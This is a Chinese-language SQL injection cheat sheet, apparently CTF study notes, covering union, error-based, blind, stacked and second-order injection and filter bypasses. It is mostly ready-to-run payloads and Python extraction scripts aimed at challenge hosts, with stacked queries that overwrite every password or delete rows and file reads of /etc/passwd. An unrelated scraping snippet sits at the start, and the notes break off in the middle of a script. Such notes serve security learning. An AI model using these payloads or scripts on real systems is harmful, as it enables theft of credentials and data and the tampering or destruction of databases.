# SQL注入

## MSYQL注入

### 常用函数

截取字符的函数:substr()

ascii编码:ASCII()

延迟函数:sleep()

```php
url = "https://aiqicha.baidu.com/company_detail_30501828527322"
res = requests.get(url=url, headers=headers).text
print(res)
# pattern = r'"website":"crcebg.crcc.cn","telephone":"88779803"'
print(re.match('"website":"(.*?)","telephone":".*?"', res))
```



### 异或注入

异或运算规则

```sql
1^1=0 0^0=0 0^1=1
1^1^1=0 1^1^0=0
```

构造payload

```sql
'^ascii(mid(database(),1,1)=98)^0
1^注入语句^1 
```



### 注入流程

#### 判断注入

```sql
?id=1' 
?id=1" 
?id=1') 
?id=1") 
?id=1' or 1#
?id=1' or 0#
?id=1' or 1=1#
?id=1' and 1=2#
?id=1' and sleep(5)#
?id=1' and 1=2 or ' 
?id=1\
```

#### 猜测字段

+ order/group语句

```sql
1' order by 1#
1' order by 2#
1' order by 3#
1 order by 1
1 order by 2
1 order by 3
```

+ union联合查询

```sql
1' union select 1#
1' union select 1,2#
1' union select 1,2,3#
1 union select 1#
1 union select 1,2#
1 union select 1,2,3#
```

#### 判断回显位

根据获取的字段数，使用union select 联合查询，查看页面回显

```sql
-1' union select 1#
-1' union select 1,2#
-1' union select 1,2,3#
-1 union select 1#
-1 union select 1,2#
-1 union select 1,2,3#
```

**注意**

>1. 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。
>
>2. ⼀定要拼接够足够的字段数，否则SQL语句报错。

#### 查询数据

+ 数据库名

```sql
-1' union select 1,2,database()--+
```

+ 表名

```sql
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+

-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+
```

+ 字段

```sql
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+

-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+
```

+ 数据

```sql
-1' union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+

-1' union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+
```

**总结**

>一般情况下就是这样的一个顺序，`确定联合查询的字段数->确定联合查询回显位置->爆库->爆表->爆字段->爆数据`。

### 报错注入

大体的思路就是利用报错回显，同时我们的查询指令或者SQL函数会被执行，**报错的过程可能会出现在查询或者插入甚至删除的过程**中。

前提是，对方服务器开启了错误显示

#### floor

> 函数返回小于或等于指定值（value）的最小整数,取整

> 通过floor报错的方法来爆数据的**本质是group by语句的报错**。group by语句报错的原因是`floor(random(0)*2)`的不确定性，即可能为0也可能为1

> group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，**如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。**

> group by `floor(random(0)*2)`出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下`floor(random(0)*2)`可能为0，如果此时临时表**只有key为1的行不存在key为0的行**，那么数据库要将该条记录**插入**临时表，由于是随机数，插时又要计算一下随机值，此时`floor(random(0)*2)`结果可能为1，就会导致插入时**冲突而报错**。即检测时和插入时两次计算了随机数的值。

其实floor()报错注入准确地说应该是floor,count,group by冲突报错

从常用语句开始分析

```sql
and select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)
```

先看floor报错的条件

```sql
select count(*) ,floor(rand(0)*2)x from security.users group by x(自定义数据库中的一张表)
```

这个`x`就是`floor(rand(0)*2)`的一个别名

```sql
mysql> select count(*),floor(rand()*2)x from security.users group by x;
+----------+---+
| count(*) | x |
+----------+---+
|        7 | 0 |
|        6 | 1 |
+----------+---+
2 rows in set (0.00 sec)
```

这样做的目的就是让`group by`和`floor(rand(0)*2)`相遇，从而触发报错

简单的报错语句

```sql
mysql> select count(*),concat(user(),floor(rand()*2))x from security.users group by x;
ERROR 1062 (23000): Duplicate entry 'root@localhost0' for key 'group_key'

select * from security.users where id=1 and(select 1 from (select count(*) ,concat(database(),floor(rand(0)*2))x from security.users group by x)a)
```

联合查询、双查询报错注入

```sql
?id=0’ union select 1,2,3 from(select count(*),concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+

/*拆解出来就是下面的语句*/
concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x
```

**当在一个聚合函数，比如count()函数后面如果使用group by分组语句的话，就可能会把查询的一部分以错误的形式显示出来。但是要多次测试才可以得到报错**

大体思路就是当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，但是因为随机数要测试多次才能得到报错，上面报错注入函数中的第一个`Floor()`就是这种情况。

#### extractvalue

在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数

```sql
updatexml（）
extractvalue（）
```

当这两个函数在执行时，如果出现xml文档路径错误就会产生报错

第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

利用

```sql
?id=1' and extractvalue(1,concat(0x7e,(select  user()),0x7e))--+

and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))
```

#### updatexml

在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数

```sql
updatexml（）
extractvalue（）
```

当这两个函数在执行时，如果出现xml文档路径错误就会	         产生报错

结构：

- 第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc
- 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
- 第三个参数：new_value，String格式，替换查找到的符合条件的数据

作用：改变文档中符合条件的节点的值

由于`updatexml`的第二个参数需要`Xpath`格式的字符串，如果不符合`xml`格式的语法，就可以实现报错注入了。

这也是一种非常常见的报错注入的函数。

```sql
' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
```

#### exp

MySQL中的EXP()函数用于将E提升为指定数字X的幂，这里E(2.718281 ...)是自然对数的底数。

```sql
EXP(X)
```

该函数返回E的X次方后的值，如下所示：

```sql
mysql> select exp(3);
+--------------------+
| exp(3)             |
+--------------------+
| 20.085536923187668 |
+--------------------+
1 row in set (0.00 sec)

mysql>
```

该函数可以用来进行 MySQL 报错注入。但是为什么会报错呢？我们知道，次方到后边每增加 1，其结果都将跨度极大，而 MySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误：

```sql
mysql> select exp(709);                                       
+-----------------------+                                     
| exp(709)              |                                     
+-----------------------+                                     
| 8.218407461554972e307 |                                     
+-----------------------+                                     
1 row in set (0.00 sec)                                       

mysql> select exp(710);                                       
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
mysql>
```

利用：使用版本：MySQL5.5.5 及以上版本

我们可以用 `~` 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出：

```sql
mysql> select ~(select version());
+----------------------+
| ~(select version())  |
+----------------------+
| 18446744073709551610 |
+----------------------+
1 row in set, 1 warning (0.00 sec)

mysql> select exp(~(select * from(select version())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '5.5.29' from dual)))'

mysql> select exp(~(select * from(select user())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

mysql> select exp(~(select * from(select database())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'ctf' from dual)))'
mysql>
```

注入数据

+ 表名

```sql
mysql> select exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'flag,users' from dual)))'
mysql>
```

+ 列名

```sql
mysql> select exp(~(select*from(select group_concat(column_name) from information_schema.columns where table_name='users')x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'id,username,password' from dual)))'
mysql>
```

+ 数据

```sql
mysql> select exp(~ (select*from(select group_concat(id, 0x7c, username, 0x7c, password) from users)x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '1|admin|123456,2|whoami|657260,3|bunny|864379' from dual)))'
mysql>
```

+ 读文件

```sql
mysql> select exp(~(select * from(select load_file('/etc/passwd'))x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin' from dual)))'
```

https://xz.aliyun.com/t/9849#toc-5

### 布尔盲注

1、在参数后添加引号尝试报错，并用`and 1=1#`和`and 1=2#`测试报错

```sql
?id=1' and 1=1# 页面返回正常
?id=1' and 1=2# 页面返回不正常
```

2、判断数据库名的长度

```sql
1'and length(database())>=1--+		页面返回正常
1'and length(database())>=13--+		页面返回正常
1'and length(database())>=14--+		页面返回错误

由此判断得到数据库名的长度是13个字符
```

3、猜解数据库名

使用逐字符判断的方式获取数据库名；

数据库名的范围一般在a~z、0~9之内，可能还会有特殊字符 "_"、"-" 等，这里的字母不区分大小写。

```sql
' and substr(database(),1,1)='a'--+
' and substr(database(),2,1)='a'--+

substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序。
```

使用ASCII码查询

```sql
' and ord(substr(database(),1,1))=97--+
```

ASCII码表中可显示字符的范围是：0-127

4、判断数据库表名

```sql
' and substr((select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),1,1)='a'--+

--修改1,1前边的1~20，逐字符猜解出第一个字段的名
--修改limit的0,1前边的0~20，逐个猜解每个字段
```

5、判断数据库字段名

```sql
' and substr((select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1),1,1)='a'--+

--修改1,1前边的1~20，逐字符猜解出第一个字段的名
--修改limit的0,1前边的0~20，逐个猜解每个字段
```

6、取数据

```sql
' and substr((select 字段名 from 表名 limit 0,1),1,1)='a'--+
```

#### 脚本：

+ GET型

```python
import requests
import time
url = 'http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/'

cookies = {       # 如果目标网站要事先登录，就加上cookies吧
    "PHPSESSID":"c8ab8r49nd2kk0qfhs0dcaktl3"
}

flag = ''
for i in range(1,90000):
   low = 32
   high = 128
   mid = (low+high)//2
   while(low<high):
       payload = "http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=0' or ascii(substr(database(),%d,1))>%d-- " %(i,mid)    # 注意get型的注入注释符要用--空格
       res = requests.get(url=payload)

       if 'You are in' in res.text:      # 为真时，即判断正确的时候的条件
           low = mid+1
       else:
           high = mid
       mid = (low+high)//2
   if(mid ==32 or mid ==127):	
       break
   flag = flag+chr(mid)
   print(flag)
```

+ POST型

```python
import requests
url = 'http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php'
flag = ''
for i in range(1,250):
   low = 32
   high = 128
   mid = (low+high)//2
   while(low<high):
       #payload = 'http://d63d924a-88e3-4036-b463-9fc6a00f4fef.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#' %(i,mid)
       payload = "0^(ascii(substr((select(flag)from(flag)),%d,1))>%d)#" %(i,mid)
       datas = {
                     "id":payload
                }
       res = requests.post(url=url,data=datas)

       if 'girlfriend' in res.text:      # 为真时，即判断正确的时候的条件
           low = mid+1
       else:
           high = mid
       mid = (low+high)//2
   if(mid ==32 or mid ==127):
       break
   flag = flag+chr(mid)
   print(flag)
```

#### 利用异或盲注

```sql
?id=0'^1--+
?id=0'^0--+
?id=0'^(ascii(substr(database(),1,1))>1)--+
?id=0'^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),{0},1))={1})--+
```

##### 脚本:

+ GET

```python
# -*- coding: utf-8 -*-
# @Author: J1am

import requests
import string
import time
url = "http://b03ef22a-194e-466b-b9cf-3dbc879514bd.node4.buuoj.cn:81/search.php"
flag = ''


def payload(i, j):
    # time.sleep(0.8)
    # 数据库名字
    # sql = "1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1"%(i,j)
    # 表名
    # sql = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))>%d)^1"%(i,j)
    # 列名
    # sql = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='Flaaaaag')),%d,1))>%d)^1"%(i,j)
    # 查询flag
    sql = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1" % (i, j)
    data = {"id": sql}
    r = requests.get(url, params=data)
    # print (r.url)
    if "Click" in r.text:
        res = 1
    else:
        res = 0
    return res


def exp():
    global flag
    for i in range(1, 10000):
        # time.sleep(0.8)
        print(i, ':')
        low = 31
        high = 127
        while low <= high:
            mid = (low + high) // 2
            res = payload(i, mid)
            if res:
                low = mid + 1
            else:
                high = mid - 1
        f = int((low + high + 1)) // 2
        if (f == 127 or f == 31):
            break
        # print (f)
        flag += chr(f)
        print(flag)


exp()
print('flag=', flag)

```

+ POST

```python
# -*- coding:utf-8 -*-
"""
 @Author: J1am
 @File: 普通无过滤注入.py
 @Data: 2022/1/8 18:11
 @Month: 1月
"""
import requests
url = 'http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php'
flag = ''
for i in range(1,250):
   low = 32
   high = 128
   mid = (low+high)//2
   while(low<high):
       #payload = 'http://d63d924a-88e3-4036-b463-9fc6a00f4fef.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#' %(i,mid)
       payload = "0^(ascii(substr((select(flag)from(flag)),%d,1))>%d)#" %(i,mid)
       datas = {
                     "id":payload
                }
       res = requests.post(url=url,data=datas)

       if 'girlfriend' in res.text:      # 为真时，即判断正确的时候的条件
           low = mid+1
       else:
           high = mid
       mid = (low+high)//2
   if(mid ==32 or mid ==127):
       break
   flag = flag+chr(mid)
   print(flag)
```

#### order by盲注

该方法只适用于表里就一行数据的时候

如果注入的时候没有报错，我们又不知道列名，就只能用 order by 盲注了。当然，在 **过滤了括号** 的时候，order by 盲注也是个很好的办法。

order by 的主要作用就是让查询出来的数据根据第n列进行排序（默认升序），我们可以使用order by排序比较字符的 ascii 码大小，从第⼀位开始比较，第⼀位相同时比较下⼀位。

+ 测试

```sql
mysql> select * from admin where username='' or 1 union select 1,2,'5' order by 3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | 5                                |
|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)

mysql> select * from admin where username='' or 1 union select 1,2,'6' order by 3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
|  1 | 2        | 6                                |
+----+----------+----------------------------------+
2 rows in set (0.01 sec)

mysql> select * from admin where username='' or 1 union select 1,2,'51' order by 3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | 51                               |
|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)

mysql> select * from admin where username='' or 1 union select 1,2,'52' order by 3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
|  1 | 2        | 52                               |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)
```

+ 脚本

```python
# -*- coding:utf-8 -*-
import requests

# 定义一个flag取值的一个“范围”
dic = "1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_!@#$%^&*"
# 之所以不定义为空，而是“^”，是为了从头开始匹配
flag = "^"
# 目标url，先传“|1”，获取其数据的排列内容，作为一个对比的基准
url1 = "https://chall.tasteless.eu/level1/index.php?dir=|1"
url2 = "http://localhost/sqli/Less-1/?id=1"
content1 = requests.get(url1).content
# 这个flag的长度被定义为了50个字符长度
for i in range(50):
    # 从定义的dic中挨个取1字符，拼凑payload
    for letter in dic:
        payload = flag + letter
        # 该url最后的“}2b1”-->"}+1"
        # url2 = "https://chall.tasteless.eu/level1/index.php?dir=|{select (select flag from level1_flag) regexp " + "'" + payload + "'" + "}%2b1"
        url2 = "https://chall.tasteless.eu/level1/index.php?dir=|{select (select flag from level1_flag) regexp " + "'" + payload + "'" + "}%2b1"
        print(url2)
        # 获取实际注入后的排列内容
        content2 = requests.get(url2).content
        # 如果不相等，即为flag内容（为什么是不相等，而不是相等，因为在url2的最后又“+1”，即匹配成功则是“?dir=|2”，匹配不成功则是“?dir=|1”）
        if (content1 != content2):
            flag = payload
            print(flag)
            break

```

### 时间盲注

盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式 。

可以用benchmark，sleep等造成延时效果的函数。

1、利用sleep判断数据库名长度

```sql
' and sleep(5) and 1=1--+	页面返回不正常，延时5秒
' and sleep(5) and 1=2--+	页面返回不正常，不延时
1' and sleep(5)#
1 and sleep(5)
```

2、获取数据库名

```sql
and if(substr(database(),1,1)='a',sleep(5),1)--+
```

一般的时间盲注主要就是使用`sleep()`函数进行时间的延迟，然后通过if判断是否执行`sleep()`：

```sql
admin' and if(ascii(substr((select database()),1,1))>1, sleep(5), 0)#
```

#### 脚本

```python
import requests
import json
import time

url = 'http://localhost/sqli/Less-1/?id='
flag = ''
for i in range(1, 250):
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:

        payload = "http://localhost/sqli/Less-1/?id=1' and if(ascii(substr((select database()),{},1))>{}, sleep(5), 0) --+".format(i, mid)
        print(payload)
        times = time.time()
        res = requests.get(url=payload)

        if time.time() - times >= 5:  # 为真时，即判断正确的时候的条件
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if mid == 32 or mid == 127:
        break
    flag = flag + chr(mid)
    print("flag{", flag)

```

#### 笛卡尔积延时盲注

`count(*)` 后面所有表中的**列笛卡尔积数**，**数量越多越卡**，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来 **打时间差**，从而达到延时注入的效果：

```sql
mysql> SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
+-----------+
| count(*)  |
+-----------+
| 978968592 |
+-----------+
1 row in set (13.23 sec)

mysql> select * from users where username='admin' and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  8 | admin    | admin    |
+----+----------+----------+
1 row in set (12.96 sec)
```

得到的结果都会有延迟。这里选用`information_schema.columns表`的原因是其内部数据较多，到时候可以根据实际情况调换。

可以使用这个原理，并配合if()语句进行延时注入了，payload 与之前相似，类似如下：

```sql
admin' and if(ascii(substr((select database()),1,1))>1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#

[OUTPUT:]
HTTP/1.1 504 Gateway Time-out    # 有很长的延时, 以至于Time-out了
```

+ 脚本

```python
import requests
url = 'http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login'
flag = ''
for i in range(1,250):
   low = 32
   high = 128
   mid = (low+high)//2
   while(low<high):
       payload = "' or if((select ascii(substr((select password from user where username='admin'),%d,1)))>%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#" % (i, mid)
       datas = {
                "username":"admin",
                "password": payload
        }
       res = requests.post(url=url,data=datas,timeout=None)    # 不限制超时

       if '504 Gateway Time-out' in res.text:      # 为真时，即判断正确的时候的条件
           low = mid+1
       else:
           high = mid
       mid = (low+high)//2
   if(mid ==32 or mid ==127):
       break
   flag = flag+chr(mid)
   print(flag)
```

### 堆叠注入

+ 快速了解

 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。

 而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all 执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products，则服务器端生成的sql语句为：

```sql
Select * from products where productid=1;DELETE FROM products
```

当执行命令后，第一条显示查询信息，第二条则将整个表进行删除。

+ 局限性

>并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。

>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，还是建议使用 union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。

> 一般存在堆叠注入的都是由于使用 `mysqli_multi_query()` 函数执行的sql语句，该函数可以执行一个或多个针对数据库的查询，多个查询用分号进行分隔。

> 时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。

#### 注入流程

```sql
# 读取数据
/?id=1';show databases;--+
/?id=1';show tables;--+
/?id=1';show tables from database_name;--+
/?id=1';show columns from table_name;--+

# 读取文件
/?id=1';select load_file('/flag');--+

# 修改数据表的结构
/?id=1';insert into users(id,username,password)values(20,'whoami','657260');--+    # 插入数据
/?id=1';update users set password='657260' where id>0;--+    # 更改数据
/?id=1';delete from users where id=20;--+    # 删除数据
/?id=1';create table fake_users like users;--+    # 创建一个新表
?id=1';rename table old_table to new_table;--+    # 更改表名
?id=1';alter table users change old_column new_column varchar(100);--+    # 更改字段名
```

#### 常见利用方式

##### 修改表名

rename 

```sql
1';rename table words to words1;rename table flag_here to words;#

# rename命令用于修改表名。
# rename命令格式：rename table 原表名 to 新表名
```

##### 修改表名与字段名

rename/alter 

```sql
1';rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#

rename命令用于修改表名。
rename命令格式：rename table 原表名 to 新表名;
```

##### HANDLER语句

如果rename、alter被过滤了，我们可以借助HANDLER语句来bypass。在不更改表名的情况下读取另一个表中的数据。

`HANDLER ... OPEN` 语句打开一个表，使其可以使用后续 `HANDLER ... READ` 语句访问，该表对象未被其他会话共享，并且在会话调用 `HANDLER ... CLOSE` 或会话终止之前不会关闭，详情请见：https://www.cnblogs.com/taoyaostudy/p/13479367.html

```sql
1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#
或
1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;#
```

##### 堆叠注入中的盲注

堆叠注入中的盲注往往是插入sql语句进行实践盲注，就比如 [SWPU2019]Web4 这道题。编写时间盲注脚本：

```python
#author: c1e4r
import requests
import json
import time

def main():
    #题目地址
    url = '''http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login'''
    #注入payload
    payloads = "asd';set @a=0x{0};prepare ctftest from @a;execute ctftest-- -"
    flag = ''
    for i in range(1,30):
        #查询payload
        payload = "select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)"
        for j in range(0,128):
            #将构造好的payload进行16进制转码和json转码
            datas = {'username':payloads.format(str_to_hex(payload.format(i,j))),'password':'test213'}
            data = json.dumps(datas)
            times = time.time()
            res = requests.post(url = url, data = data)
            if time.time() - times >= 3:
                flag = flag + chr(j)
                print(flag)
                break

def str_to_hex(s):
    return ''.join([hex(ord(c)).replace('0x', '') for c in s])

if __name__ == '__main__':
    main()
```

### 二次注入

通常二次注入的成因会是插入语句，我们控制自己想要查询的语句插入到数据库中再去找一个**能显示插入数据的回显的地方**（可能是登陆后的用户名等等、也有可能是删除后显示删除内容的地方~），恶意插入查询语句的示例如下：

```sql
insert into users(id,username,password,email) values(1,'0'+hex(database())+'0','0'+hex(hex(user()))+'0','123@qq.com')

insert into users(id,username,password,email) values(1,'0'+substr((select hex(hex(select * from flag))),1,10)+'0','123456','123@qq.com')
```

需要对后端的SQL语句有一个猜测

这里还有一个点，我们不能直接将要查询的函数插入，因为如果直接插入的话，`'database()'`会被识别为字符串，我们需要想办法闭合前后单引号的同时将我们的查询插入，就出现了`'0'+database()+'0'`这样的构造，但是这个的回显是`0`，但是在我们进行了hex编码之后就能正常的查询了，也就是上面出现的`'0'+hex(database())+'0'`

#### 注入流程

首先找到插入点，通常情况下是一个注册页面，`register.php`这种，先简单的查看一下注册后有没有什么注册时写入的信息在之后又回显的，若有回显猜测为二次查询。

```sql
insert into users(id,username,password,email) values(1,'0'+hex(database())+'0','0'+hex(hex(user()))+'0','123@qq.com')

insert into users(id,username,password,email) values(1,'0'+substr((select hex(hex(select * from flag))),1,10)+'0','123456','123@qq.com')
```

构造类似于values中的参数进行注册等操作，然后进行查看，将hex编码解码即可，可能会有其他的先限制，比如超过10位就会转化为科学计数法，我们就需要使用`from for`语句来进行一个限制，可以编写脚本。

```python
import requests
import string
import re as r
import time
ch = string.ascii_lowercase+string.digits+'-}'+'{'

re = requests.session()
url = 'http://9a88c359-4f55-44e9-9332-4c635c486ef0.node3.buuoj.cn/'

def register(email,username):
    url1 = url+'register.php'
    data = dict(email = email, username = username,password = '123')
    html = re.post(url1,data=data)
    html.encoding = 'utf-8'
    return html

def login(email):
    url2 = url+'login.php'
    data = dict(email = email,password = '123')
    html = re.post(url2, data=data)
    html.encoding = 'utf-8'
    return html


hex_flag = ''
for j in range(0,17):
    payload = "0'+(select substr(hex(hex((select * from flag))) from {} for {}))+'0".format(int(j)*10+1,10)
    email = '{}@qq.com'.format(str(j)+'14')
    html = register(email,payload)
    # print html.text
    html = login(email)
    try:
        res = r.findall(r'<span class="user-name">(.*?)</span>',html.text,r.S)
        hex_flag += str(res[0]).strip()
        print hex_flag
    except:
        pass
    time.sleep(1)
print hex_flag.decode('hex').decode('hex')
```

## 常见绕过

### 注释符绕过

```sql
、#    %23    --+或-- -    ;%00
```

如果所有的注释符全部被过滤了，把我们还可以尝试直接使用引号进行闭合，这种方法很好用。

```sql
'
"
')
")
```

### 字符串变换绕过

**大小写绕过**

```sql
-1' UnIoN SeLeCt 1,2,database()--+
```

**双写绕过**

通常是后台将关键字替换为空的时候利用

```sql
-1' uniunionon selselectect 1,2,database()--+
```

**字符串拼接绕过**

```sql
1';set @a=concat("sel","ect * from users");prepare sql from @a;execute sql;
```

### 过滤and、or绕过

**管道符**

```sql
and => &&
or => ||
```

**异或绕过**

```sql
异或运算规则:
1^1=0 0^0=0 0^1=1
1^1^1=0 1^1^0=0
构造payload:'^ascii(mid(database(),1,1)=98)^0
```

**注意**: 这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的

### 过滤空格绕过

```sql
# 使用注释符/**/代替空格:
select/**/database();

# 使用加号+代替空格:(只适用于GET方法中)
select+database();
# 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)

# 使⽤括号嵌套:
select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());

# 使⽤其他不可⻅字符代替空格:
%09, %0a, %0b, %0c, %0d, %a0

#利用``分隔进行绕过
select host,user from user where user='a'union(select`table_name`,`table_type`from`information_schema`.`tables`);
```

有些特殊情况也可以使用^异或盲注

### 过滤括号绕过

### 过滤比较符号(=、<、>)绕过

#### 使用in()绕过

```sql
/?id=' or ascii(substr((select database()),1,1)) in(114)--+    // 错误
/?id=' or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显

/?id=' or substr((select database()),1,1) in('s')--+    // 正常回显
```

脚本

```python
import requests

url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id="

payload = "' or ascii(substr((select database()),{0},1)) in({1})--+"
flag = ''
if __name__ == "__main__":
    for i in range(1, 100):
        for j in range(37,128):
            url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=' or ascii(substr((select database()),{0},1)) in({1})--+".format(i,j)
            r = requests.get(url=url)
            if "You are in" in r.text:
                flag += chr(j)
                print(flag)
```

#### LIKE注入

在LIKE子句中，百分比(%)通配符允许**匹配任何字符串的零个或多个字符**。下划线 `_` 通配符允许**匹配任何单个字符**。**匹配成功则返回1，反之返回0**，可用于sql盲注。

1、判断数据库长度

可用length()函数，也可用`_`，如：

```sql
/?id=' or database() like '________'--+  // 回显正常
```

2、判断数据库名

```sql
/?id=' or database() like 's%' --+
/?id=' or (select database()) like 's%' --+
或者:
/?id=' or database() like 's_______' --+
/?id=' or (select database()) like 's_______' --+
```

脚本

```python
import requests
import string

# strs = string.printable
strs = string.ascii_letters + string.digits + '_'
url = "http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id="

